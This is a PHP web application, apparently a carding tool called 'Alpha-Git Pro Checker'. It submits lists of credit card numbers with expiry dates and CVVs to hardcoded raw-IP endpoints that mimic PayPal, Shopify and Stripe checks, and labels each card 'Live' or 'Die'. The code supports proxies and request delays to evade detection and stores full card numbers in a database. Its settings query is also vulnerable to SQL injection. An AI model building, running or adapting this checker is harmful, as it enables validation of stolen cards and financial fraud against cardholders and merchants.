<?php
session_start();
require_once 'includes/db_connection.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}

ini_set('max_execution_time', 300);
ini_set('memory_limit', '512M');

$user_id = $_SESSION['user_id'];
$error = '';
$results = [];

// التأكد من وجود العمود api_used
$conn->query("ALTER TABLE card_checks ADD COLUMN IF NOT EXISTS api_used VARCHAR(50) DEFAULT NULL");

// إنشاء جدول الإعدادات
$conn->query("CREATE TABLE IF NOT EXISTS user_settings (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL UNIQUE,
    settings TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
)");

// الـ APIs
$apis = [
    'paypal' => ['name' => 'PayPal', 'url' => 'http://138.128.240.15:8025/paypal_donate?cc='],
    'shopify' => ['name' => 'Shopify', 'url' => 'http://108.165.12.183:8081/?'],
    'stripe' => ['name' => 'Stripe', 'url' => 'http://138.128.240.15:8009/stripe_auth?cc=']
];

// دالة الفحص
function checkCard($card, $api, $site = '', $proxy = null) {
    $url = $api['url'] . urlencode($card);
    if ($api['name'] == 'Shopify' && $site) {
        $url .= '&url=' . urlencode($site);
    }
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 25,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);
    
    if ($proxy && !empty($proxy['url'])) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy['url']);
        if (!empty($proxy['port'])) curl_setopt($ch, CURLOPT_PROXYPORT, $proxy['port']);
        if (!empty($proxy['user']) && !empty($proxy['pass'])) {
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['user'] . ':' . $proxy['pass']);
        }
    }
    
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);
    
    $status = 'Die';
    $message = 'Unknown';
    
    if ($info['http_code'] == 200 && $response) {
        $lower = strtolower($response);
        if (preg_match('/declined|error|invalid|insufficient|expired|do not honor|generic_error|card_declined/i', $lower)) {
            $status = 'Die';
            $message = 'Declined';
        } elseif (preg_match('/approved|success|charged|captured|authorized|live/i', $lower)) {
            $status = 'Live';
            $message = 'Approved';
        } else {
            $status = 'Die';
            $message = substr($response, 0, 80);
        }
    } elseif ($info['http_code'] == 0) {
        $status = 'Error';
        $message = 'Timeout';
    } else {
        $status = 'Error';
        $message = 'HTTP ' . $info['http_code'];
    }
    
    return ['status' => $status, 'message' => $message, 'time' => round($info['total_time'], 2)];
}

// حفظ النتيجة
function saveResult($conn, $user_id, $card, $api_name, $status, $message) {
    $stmt = $conn->prepare("INSERT INTO card_checks (user_id, card_number, api_used, status, message) VALUES (?, ?, ?, ?, ?)");
    $stmt->bind_param("issss", $user_id, $card, $api_name, $status, $message);
    return $stmt->execute();
}

// جلب الإعدادات
$user_settings = [];
$stmt = $conn->prepare("SELECT settings FROM user_settings WHERE user_id = ?");
$stmt->bind_param("i", $user_id);
$stmt->execute();
$result = $stmt->get_result();
if ($row = $result->fetch_assoc()) {
    $user_settings = json_decode($row['settings'], true);
}

// جلب آخر 50 نتيجة للمستخدم
$recent_stmt = $conn->prepare("SELECT * FROM card_checks WHERE user_id = ? ORDER BY check_date DESC LIMIT 50");
$recent_stmt->bind_param("i", $user_id);
$recent_stmt->execute();
$recent_results = $recent_stmt->get_result()->fetch_all(MYSQLI_ASSOC);

// معالجة POST
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $cards_input = trim($_POST['cards'] ?? '');
    $api_key = $_POST['api_type'] ?? ($user_settings['api'] ?? 'paypal');
    $delay = max(500, min(5000, intval($_POST['delay'] ?? 1000)));
    $site_url = $_POST['site_url'] ?? '';
    
    $proxy = [];
    if (isset($_POST['use_proxy']) && !empty($_POST['proxy_url'])) {
        $proxy = [
            'url' => $_POST['proxy_url'],
            'port' => $_POST['proxy_port'] ?? '',
            'user' => $_POST['proxy_user'] ?? '',
            'pass' => $_POST['proxy_pass'] ?? ''
        ];
    }
    
    // حفظ الإعدادات
    $settings = ['api' => $api_key, 'delay' => $delay, 'site_url' => $site_url];
    if ($proxy) $settings['proxy'] = $proxy;
    $json = json_encode($settings);
    $conn->query("INSERT INTO user_settings (user_id, settings) VALUES ($user_id, '$json') 
                  ON DUPLICATE KEY UPDATE settings = '$json'");
    
    $cards = array_filter(array_map('trim', explode("\n", $cards_input)));
    $api = $apis[$api_key];
    $total = count($cards);
    
    foreach ($cards as $index => $card) {
        if ($index > 0 && $delay > 0) {
            usleep($delay * 1000);
        }
        
        $result = checkCard($card, $api, $site_url, $proxy);
        saveResult($conn, $user_id, $card, $api['name'], $result['status'], $result['message']);
        
        $results[] = [
            'card' => $card,
            'status' => $result['status'],
            'message' => $result['message'],
            'time' => $result['time']
        ];
    }
    
    // تحديث النتائج الحديثة
    $recent_stmt = $conn->prepare("SELECT * FROM card_checks WHERE user_id = ? ORDER BY check_date DESC LIMIT 50");
    $recent_stmt->bind_param("i", $user_id);
    $recent_stmt->execute();
    $recent_results = $recent_stmt->get_result()->fetch_all(MYSQLI_ASSOC);
}

// عرض الصفحة الرئيسية
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alpha-Git Pro Checker</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background: #0a0e27; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .card { background: #1a1f3a; border: none; border-radius: 12px; margin-bottom: 20px; }
        .card-header { background: #1a1f3a; border-bottom: 1px solid #2a2f4a; color: #00ff88; font-weight: bold; }
        .form-control, .form-select { background: #2a2f4a; border: none; color: #fff; }
        .form-control:focus, .form-select:focus { background: #2a2f4a; color: #fff; box-shadow: none; border: 1px solid #00ff88; }
        .btn-primary { background: #00ff88; border: none; color: #0a0e27; font-weight: bold; }
        .btn-primary:hover { background: #00cc66; }
        .btn-secondary { background: #2a2f4a; border: none; color: #fff; }
        .api-card { cursor: pointer; transition: all 0.3s; background: #1a1f3a; border: 2px solid #2a2f4a; }
        .api-card:hover { transform: translateY(-3px); border-color: #00ff88; }
        .api-card.selected { border-color: #00ff88; background: #1a2f3a; }
        .form-label { color: #aaa; }
        textarea { resize: vertical; }
        h4, h5 { color: #fff; }
        h6 {
  font-size: 1rem;
  color: aquamarine;
}
.text-muted {
  --bs-text-opacity: 1;
  color: rgba(255, 255, 255, 0.75) !important;
}
        .alert-info { background: #1a2f3a; border-color: #00ff88; color: #00ff88; }
        .alert-secondary { background: #1a1f3a; border-color: #2a2f4a; color: #aaa; }
        .nav-link { color: #aaa !important; }
        .navbar { background: #0a0e27 !important; border-bottom: 1px solid #2a2f4a; }
        .proxy-section { display: none; margin-top: 15px; padding: 15px; background: #1a1f3a; border-radius: 8px; }
        .proxy-section.show { display: block; }
        .status-badge { padding: 5px 12px; border-radius: 20px; font-size: 0.8rem; display: inline-block; }
        .status-live { background: #00ff88; color: #0a0e27; }
        .status-die { background: #ff4466; color: #fff; }
        .status-error { background: #ffaa00; color: #0a0e27; }
        .result-row { transition: all 0.3s; }
        .result-row:hover { background: #2a2f4a; }
        .table { color: #fff; }
        .table thead th { border-bottom-color: #2a2f4a; color: #00ff88; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 2px solid #00ff88; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark">
        <div class="container">
            <a class="navbar-brand" href="#"><i class="fas fa-code-branch"></i> Alpha-Git Pro</a>
            <div class="collapse navbar-collapse">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item"><a class="nav-link" href="index.php">Dashboard</a></li>
                    <li class="nav-item"><a class="nav-link active" href="checker.php">Checker</a></li>
                    <li class="nav-item"><a class="nav-link" href="generator.php">Generator</a></li>
                    <li class="nav-item"><a class="nav-link" href="logout.php">Logout</a></li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
        <div class="row">
            <div class="col-md-12">
                <div class="card">
                    <div class="card-header">
                        <h4 class="mb-0"><i class="fas fa-credit-card"></i> Ultra Card Checker</h4>
                    </div>
                    <div class="card-body">
                        <!-- API Selection -->
                        <div class="row mb-4">
                            <div class="col-12">
                                <label class="form-label fw-bold">Select API:</label>
                                <div class="row">
                                    <?php foreach ($apis as $key => $api): ?>
                                    <div class="col-md-4">
                                        <div class="card api-card <?php echo ($user_settings['api'] ?? 'paypal') == $key ? 'selected' : ''; ?>" 
                                             onclick="selectAPI('<?php echo $key; ?>')">
                                            <div class="card-body text-center">
                                                <i class="fas fa-bolt fa-2x mb-2" style="color: #00ff88"></i>
                                                <h6><?php echo $api['name']; ?></h6>
                                                <small class="text-muted">Instant Check</small>
                                            </div>
                                        </div>
                                    </div>
                                    <?php endforeach; ?>
                                </div>
                            </div>
                        </div>
                        
                        <form method="POST" action="" id="checkerForm">
                            <input type="hidden" name="api_type" id="api_type" value="<?php echo $user_settings['api'] ?? 'paypal'; ?>">
                            
                            <div class="row">
                                <div class="col-md-8">
                                    <div class="mb-3">
                                        <label class="form-label">💳 Cards (one per line):</label>
                                        <textarea class="form-control" name="cards" id="cardsInput" rows="8" 
                                            placeholder="5356740152660007|09|2026|514
4111111111111111|12|2025|123
4000228782378185|08|2031|508" required><?php echo isset($_POST['cards']) ? htmlspecialchars($_POST['cards']) : ''; ?></textarea>
                                        <div class="form-text">Format: NUMBER|MM|YYYY|CVV</div>
                                    </div>
                                    
                                    <div class="row">
                                        <div class="col-md-6">
                                            <div class="mb-3">
                                                <label class="form-label">⏱️ Delay (ms):</label>
                                                <input type="number" class="form-control" name="delay" 
                                                       value="<?php echo $user_settings['delay'] ?? '1000'; ?>" 
                                                       min="500" max="5000" step="100">
                                            </div>
                                        </div>
                                        <div class="col-md-6" id="shopifyDiv" style="display: <?php echo ($user_settings['api'] ?? 'paypal') == 'shopify' ? 'block' : 'none'; ?>">
                                            <div class="mb-3">
                                                <label class="form-label">🛒 Shopify Site:</label>
                                                <input type="text" class="form-control" name="site_url" 
                                                       value="<?php echo htmlspecialchars($user_settings['site_url'] ?? ''); ?>"
                                                       placeholder="https://store.myshopify.com">
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Proxy -->
                                    <div class="mb-3">
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="useProxy" name="use_proxy" <?php echo isset($user_settings['proxy']) ? 'checked' : ''; ?>>
                                            <label class="form-check-label" for="useProxy">🌐 Use Proxy</label>
                                        </div>
                                        <div id="proxySettings" class="proxy-section <?php echo isset($user_settings['proxy']) ? 'show' : ''; ?>">
                                            <div class="row">
                                                <div class="col-md-5"><input type="text" class="form-control mb-2" name="proxy_url" placeholder="Proxy IP" value="<?php echo htmlspecialchars($user_settings['proxy']['url'] ?? ''); ?>"></div>
                                                <div class="col-md-2"><input type="text" class="form-control mb-2" name="proxy_port" placeholder="Port" value="<?php echo htmlspecialchars($user_settings['proxy']['port'] ?? ''); ?>"></div>
                                                <div class="col-md-3"><input type="text" class="form-control mb-2" name="proxy_user" placeholder="Username"></div>
                                                <div class="col-md-2"><input type="password" class="form-control mb-2" name="proxy_pass" placeholder="Password"></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="col-md-4">
                                    <div class="alert alert-info">
                                        <i class="fas fa-info-circle"></i>
                                        <strong>How it works:</strong>
                                        <ul class="mb-0 mt-2">
                                            <li>Each card is checked individually</li>
                                            <li>Results appear LIVE as they come</li>
                                            <li><span class="status-badge status-live">Live</span> = Valid card</li>
                                            <li><span class="status-badge status-die">Die</span> = Dead/Expired</li>
                                        </ul>
                                    </div>
                                    <div class="alert alert-secondary">
                                        <i class="fas fa-database"></i>
                                        <strong>Saved Cards:</strong><br>
                                        <small>All results are saved to database for later review</small>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="d-flex gap-2">
                                <button type="submit" class="btn btn-primary px-4 py-2" id="submitBtn">
                                    <i class="fas fa-play"></i> Start Checking
                                </button>
                                <button type="button" class="btn btn-secondary" onclick="clearForm()">
                                    <i class="fas fa-trash"></i> Clear
                                </button>
                            </div>
                        </form>
                        
                        <!-- نتائج الفحص الحالية -->
                        <?php if (!empty($results)): ?>
                        <div class="mt-5" id="currentResults">
                            <h5><i class="fas fa-list-check"></i> Current Results</h5>
                            <div class="table-responsive">
                                <table class="table table-hover">
                                    <thead>
                                        <tr><th>Card</th><th>Status</th><th>Message</th><th>Time</th></tr>
                                    </thead>
                                    <tbody>
                                        <?php foreach ($results as $result): ?>
                                        <?php 
                                        $status_class = strtolower($result['status']);
                                        $card_preview = substr($result['card'], 0, 25) . '...';
                                        ?>
                                        <tr class="result-row">
                                            <td><code><?php echo htmlspecialchars($card_preview); ?></code></td>
                                            <td><span class="status-badge status-<?php echo $status_class; ?>"><?php echo $result['status']; ?></span></td>
                                            <td><small><?php echo htmlspecialchars(substr($result['message'], 0, 60)); ?></small></td>
                                            <td><?php echo $result['time']; ?>s</td>
                                        </tr>
                                        <?php endforeach; ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <?php endif; ?>
                        
                        <!-- الكروت المحفوظة سابقاً -->
                        <?php if (!empty($recent_results)): ?>
                        <div class="mt-5">
                            <h5><i class="fas fa-history"></i> Previous Checks (Last 50)</h5>
                            <div class="table-responsive" style="max-height: 400px; overflow-y: auto;">
                                <table class="table table-sm table-hover">
                                    <thead>
                                        <tr>
                                            <th>Date</th>
                                            <th>Card</th>
                                            <th>API</th>
                                            <th>Status</th>
                                            <th>Result</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php foreach ($recent_results as $row): ?>
                                        <?php 
                                        $status_class = strtolower($row['status']);
                                        $time = date('H:i:s d/m', strtotime($row['check_date']));
                                        $card_preview = substr($row['card_number'], 0, 20) . '...';
                                        ?>
                                        <tr>
                                            <td><small><?php echo $time; ?></small></td>
                                            <td><code><small><?php echo htmlspecialchars($card_preview); ?></small></code></td>
                                            <td><small><?php echo htmlspecialchars($row['api_used'] ?? '-'); ?></small></td>
                                            <td><span class="status-badge status-<?php echo $status_class; ?>" style="font-size:0.7rem; padding:2px 8px;"><?php echo $row['status']; ?></span></td>
                                            <td><small><?php echo htmlspecialchars(substr($row['message'], 0, 50)); ?></small></td>
                                        </tr>
                                        <?php endforeach; ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <footer class="text-center mt-5 py-3" style="color: #555">
        <small>Alpha-Git Pro Checker | High Performance Mode</small>
    </footer>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function selectAPI(api) {
            document.getElementById('api_type').value = api;
            document.querySelectorAll('.api-card').forEach(c => c.classList.remove('selected'));
            event.currentTarget.classList.add('selected');
            document.getElementById('shopifyDiv').style.display = api === 'shopify' ? 'block' : 'none';
        }
        
        document.getElementById('useProxy')?.addEventListener('change', function() {
            document.getElementById('proxySettings').classList.toggle('show', this.checked);
        });
        
        function clearForm() {
            if (confirm('Clear all cards?')) {
                document.getElementById('cardsInput').value = '';
            }
        }
        
        // تحميل النتائج تلقائياً عند إرسال الفورم
        document.getElementById('checkerForm').addEventListener('submit', function() {
            const btn = document.getElementById('submitBtn');
            btn.innerHTML = '<span class="loading"></span> Checking...';
            btn.disabled = true;
        });
    </script>
</body>
</html>

